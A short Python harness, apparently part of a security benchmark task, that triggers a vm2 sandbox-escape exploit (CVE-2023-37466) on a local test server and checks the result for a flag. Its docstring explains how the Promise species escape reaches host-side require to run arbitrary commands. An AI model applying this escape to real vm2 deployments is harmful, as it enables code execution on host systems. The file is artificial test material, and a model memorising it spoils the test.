#!/usr/bin/env python3
"""[GIVEN] CVE-2023-37466 seed exploit for vm2-cve-2026-24120.

Promise[@@species] escape: the sandboxed code replaces the constructor species of
a rejected async function's promise with a host-side FakePromise whose executor
receives the host Error object, reaching process.mainModule.require and running
arbitrary commands. On v0 (3.9.19) the sanitized Promise.prototype.then is
bypassed directly; on v1 (3.10.0) resetPromiseSpecies restores the species
(CVE-2023-37466 fix) so this exact payload is blocked.
"""
import sys
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import vm2_util as u  # noqa: E402


def candidate(*, version="v1", flag=None):
    try:
        urllib.request.urlopen(f"{u.BASE[version]}/exploit?kind=37466", timeout=30).read()
    except Exception:
        pass
    out = u.read_result(version)
    return {"ok": (flag in out) if flag else bool(out), "result": out[:100]}


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(candidate(version=v))
